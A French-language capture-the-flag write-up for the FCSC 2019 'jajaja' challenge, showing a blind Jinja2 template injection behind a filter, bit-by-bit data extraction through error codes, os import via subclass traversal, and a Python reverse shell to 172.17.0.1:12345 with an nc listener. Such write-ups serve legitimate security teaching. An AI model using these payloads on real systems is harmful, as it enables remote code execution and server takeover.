[FR] Writeup FCSC 2019 - jajaja

March 19, 2024
  • web
  • jinja2
  • ssti
  • python
  • blind
  • fcsc

Dans ce challenge proposé lors du FCSC 2019, nous sommes confrontés à un blog présentant sous ses articles une section commentaire. Notre objectif sera d’injecter un code malicieux dans un commentaire afin de prendre le contrôle du serveur, et récupérer le flag.

Petit tour du propriétaire

Nous sommes en présence d’un blog Wordpress, rien de plus classique.

On observe sous le premier article l’existence d’une section commentaire. Le contenu de l’article nous renseigne sur le caractère « fait maison » du code côté serveur de la section commentaire. On peut donc espérer une faille permettant l’injection de code malicieux, du fait du manque d’une validation correcte des entrées utilisateur. Tout ceci n’est pour l’instant que pure hypothèse, nous sommes en phase d’exploration.

Wordpress étant écrit en PHP, on essaye naïvement d’injecter une balise PHP:

<?php
system("sleep 10");
?>

Si la page met 10 secondes à charger, on sait que l’injection fonctionne.

Malheureusement, aucun signe d’injection réussie. Une inspection minutieuse du code source HTML de la page ne nous renseigne d’ailleurs aucunement… à moins que…

Tromperie, et rires hispanophones

Le site affiche fièrement en pied de page : Ce blog est propulsé par Wordpress. Mais c’est bien là le seul indice nous menant vers cette piste. Cette annonce ne serait-elle pas là justement pour nous induire en erreur ? Rappelons-nous le titre du challenge, “jajaja” (NDLR ; C’est la traduction espagnole de notre hahaha français.) Le concepteur du challenge se moquerait-il ouvertement de nous ? (Oui.)

Faisons une requête à la main avec curl -v et observons les Headers renvoyés par le serveur. (-v pour verbose, affiche les Headers HTTP)

Dans les Headers HTTP renvoyés par le serveur, on peut lire Server: Werkzeug/2.0.3 Python/3.10.13. Il ne s’agit donc pas d’un site Wordpress ! Dans ce cas, le Header nous aurait parlé de Apache2, Nginx ou PHP… Nous avons été trompés.

Une petite recherche sur Duckduckgo nous apprend qu’il s’agit probablement d’un serveur Flask. Une deuxième nous apprend que le serveur utilise sans doute le système de template Jinja2 (par défaut avec Flask). Cette bibliothèque permet d’écrire du code Python directement dans les pages HTML.

Essayons donc, au lieu de notre injection PHP une injection de template Jinja2.

{{1+1}}

Essayons aussi une injection invalide.

{{ :"'é)ç^&" }}

On est sur la bonne piste ! On a réussi à déclencher le WAF (Web Application Firewall), mais aussi une erreur.

Première injection et bypass du WAF

Le post de blog semble indiquer une stratégie d’implémentation pour le filtre, qui peut nous permettre de le contourner en s’assurant que le résultat de l’évaluation fait la même taille que le script lui-même. Essayons donc un payload vérifiant cette contrainte.

{{"A"*10}}

Ce code fait 10 caractères, et sa sortie fait également 10 caractères. (AAAAAAAAAA)

On a réussi à bypass le WAF ! Mais le résultat de l’interprétation des templates n’est pas affiché. Le WAF semble évaluer les commentaires pour détecter leur caractère malicieux (ie. contient un template), mais jette ensuite ce résultat aux ordures pour finalement afficher le texte original. Il nous est donc impossible d’afficher quoi que ça soit. Nous avançons les yeux bandés.

Objectif: exécuter des commandes shell

Puisque l’on peut injecter du code Python, on a envie d’exécuter un reverse shell pour prendre le contrôle du serveur. En Python, on peut exécuter des commandes systèmes (shell) arbitraires avec la fonction os.system("COMMANDE").

Sur un malentendu, essayons un payload Python classique. Si ça marche, on a gagné ! Ce code attendra 10 secondes avant de renvoyer la page, si l’injection est réussie, et nous prouve qu’on a réussi à exécuter des commandes arbitraires.

{{ __import__("os").system("sleep 10")  }}

Malheureusement, il n’en est rien, et on se prend une erreur 500 :(

La raison de cette erreur ici est que __import__ est une fonction built-in innacessible dans le contexte des templates Jinja2. En fait, on ne sait même pas à quoi on a accès. Probablement pas grand-chose.

Chasse au trésor

Nous ne savons pas à quelles variables ou fonctions nous avons accès, mais nous avons toujours accès aux constantes faisant partie du langage : [], 0, "", etc. À partir de celles, nous pouvons retrouver, grâce aux attributs spéciaux des variables Python, toutes les classes importées dans le script, et nous en servir. À partir de la chaîne de caractère vide, on récupère la classe str, puis sa classe parent object, puis toutes les classes enfant de object… c’est-à-dire toutes les classes.

>>> ''
''

>>> ''.__class__
<class 'str'>

>>> ''.__class__.mro()[1]
<class 'object'>

>>> ''.__class__.mro()[1].__subclasses__()
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, 
[... ensemble des classes importées en local ...]

J’exécute ce code dans mon terminal Python 3.11.8. J’ai la mauvaise version de Python, pas les mêmes bibliothèques, il n’y a aucune chance pour que le serveur ait les mêmes classes dans le même ordre, dans cette liste !

Si je savais quelles classes le serveur possède, je pourrais utiliser l’une d’entre elles pour importer os et appeler os.system, ou utiliser directement subprocess.Popen pour exécuter une commande. Les possibilités sont infinies. Mais je suis aveugle…

Extraction de string bit par bit

Notre cécité est à ce point la plus grosse épine dans notre pied. Essayons de retrouver la vue. Avec les payloads suivants, on peut déclencher une erreur 403 ou une erreur 500 en fonction de la valeur d’une variable :

{{ [0,None][X] + 123 }}

Si X vaut 0, pas d’erreur, le résultat est 123 et on obtient l’erreur 403 du WAF. Mais si X vaut 1, on exécute l’opération None + 123, qui est impossible, et l’erreur Python TypeError: unsupported operand type(s) for +: 'NoneType' and 'int' fait terminer la requête avec un code d’erreur 500.

Puisque nous pouvons faire dépendre le code d’erreur (403 ou 500) d’une valeur calculée par notre script, on peut extraire un nombre bit par bit (403 -> 0, 500 -> 1, ou l’inverse). Essayons désormais d’extraire une chaîne de caractère. Une fois ceci fait, on pourra extraire str(''.__class__.mro()[1].__subclasses__()) afin de lister les classes disponibles côté serveur.

On construit petit à petit un script inline (ie. sur une seule ligne, c’est mieux pour l’injecter dans un template) permettant l’extraction bit à bit d’une chaîne entière. I note ici l’index du caractère à récupérer dans le string, et J l’indice du chiffre binaire du code ASCII 8-bit de ce caractère. S est la chaîne à extraire.

>>> S="toto"; I=0; J=0

>>> S[I]
't'

>>> ord(S[I])
116

>>> bin(ord(S[I]))
'0b1110100'

>>> bin(ord(S[I]))[2:]
'1110100'

>>> bin(ord(S[I]))[2:].zfill(8)
'01110100'

>>> bin(ord(S[I]))[2:].zfill(8)[J]
'0'

>>> int(bin(ord(S[I]))[2:].zfill(8)[J])
0

[0,None][int(bin(ord(S[I]))[2:].zfill(8)[J])]+123

Maintenant il suffit d’incrémenter I pour chaque caractère à récupérer, en faisant varier J de 0 à 7 (inclus), pour récupérer une chaîne de caractère arbitraire.

Reconstruction de built-ins inaccessibles

Pour retrouver les fonctions int et str, on peut remonter depuis 0 et "" avec les mots-clés magiques Python sur les objets :

On peut désormais convertir en int :

>>> (0).__class__
<class 'int'>

>>> (0).__class__("123")
123

Et en str :

>>> "".__class__
<class 'str'>

>>> "".__class__([1,2,3])
'[1, 2, 3]'

Pour ce qui est de l’équivalent de bin(123)[2:], qui donne l’écriture binaire d’un nombre sans le préfixe 0b, on peut utiliser les fonctions de string formatting des chaînes de caractères Python:

>>> "{:b}".format(123)
'1111011'

Script local pour dump une chaîne bit par bit

Nous avons notre orange, mais il nous manque encore le presse-agrumes. Il faut désormais faire un petit script qui ira interroger le serveur autant de fois que nécessaire pour récupérer tous les bits d’une chaîne de caractères du serveur, et la recomposer en local. Ici, on essaye d’extraire ''.__class__(''.__class__.mro()[1].__subclasses__()), qui nous donne la liste des classes importées sur le serveur.

Importer le module os

En parcourant les classes importées sur le serveur, on tombe sur <class '_frozen_importlib.BuiltinImporter'> à la position 104. On peut s’en servir pour importer os et exécuter des commandes arbitraires sur le serveur.

{{ ''.__class__.mro()[1].__subclasses__()[104]().load_module("os").system("sleep 10") }}

En envoyant ce payload au serveur, on reçoit une erreur 403… après 10 secondes ! L’injection de commande shell arbitraire est réussie.

Reverse shell

Maintenant, on veut prendre le contrôle du serveur, alors on se rend, tout joyeux, car sachant que le flag n’est pas très loin, sur https://www.revshells.com/ pour récupérer notre reverse shell préféré.

Chez nous, on lance nc -l -v -p 12345. On pense à récupérer son IP et à faire le nécessaire pour être contactable par le serveur (port-forwarding; pas utile dans mon cas).

Sur le serveur, on lance le reverse shell. J’ai choisi :

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Ce qui donne, enrobé dans notre payload d’injection de commande shell :

{{ ''.__class__.mro()[1].__subclasses__()[104]().load_module("os").system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.1\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'") }}

On lance le payload, et la magie s’opère. On a un *shell.

/app $ cat flag.txt

Conclusion

Passer par l’extraction en aveugle n’était sans doute pas la manière la plus rapide d’obtenir le flag, mais je trouve qu’on s’est bien amusé :-).
